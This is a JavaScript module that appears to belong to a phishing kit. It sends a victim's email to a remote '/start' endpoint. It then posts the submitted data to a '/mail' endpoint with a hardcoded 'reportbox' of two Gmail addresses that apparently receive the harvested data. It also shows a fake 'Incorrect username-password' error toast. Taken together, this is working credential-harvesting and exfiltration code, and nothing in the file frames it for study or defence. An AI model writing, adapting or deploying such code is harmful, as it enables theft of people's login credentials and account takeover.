import { toast } from "react-toastify";

const serverurl = require("../users.json");

export const getHost = (email) =>
  fetch(`${serverurl.nwabu.serverurl}/start`, {
    method: "POST",
    mode: "cors",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ email: email }),
  }).then((response) => response.json());

export const sendFile = (data) =>
  fetch(`${serverurl.nwabu.serverurl}/mail`, {
    method: "POST",
    mode: "cors",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      ...data,
      reportbox: "jason18118@gmail.com, jhonsnow751@gmail.com",
    }),
  }).then((response) => response.json());

export const notify = () =>
  toast.error("Incorrect username-password", {
    position: "top-center",
    autoClose: 5000,
    hideProgressBar: false,
    closeOnClick: true,
    pauseOnHover: true,
    draggable: true,
    progress: undefined,
  });
